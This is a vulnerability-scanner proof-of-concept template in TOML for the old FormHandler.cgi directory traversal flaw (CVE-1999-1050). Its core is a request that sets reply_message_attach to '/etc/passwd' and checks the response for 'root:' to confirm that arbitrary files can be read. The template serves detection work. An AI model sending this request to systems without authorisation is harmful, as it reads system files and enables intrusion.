[info]
author = "ave"
description = "通过 FormHandler.cgi 的 reply_message_attach 参数注入路径遍历序列，验证是否存在任意文件读取漏洞。"
id = "POC-AVE-1999-0901"
name = "Matt Wright FormHandler.cgi 目录遍历漏洞 PoC"
severity = "medium"
tags = ["ave-1999-0901"]
vuln_id = [
    "CVE-1999-1050",
    "AVE-1999-0901",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/formhandler.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[request.query]
from = "attacker@example.com"
message = "test"
redirect = ""
reply_message_attach = "text:/etc/passwd"
subject = "test"
to = "test@example.com"
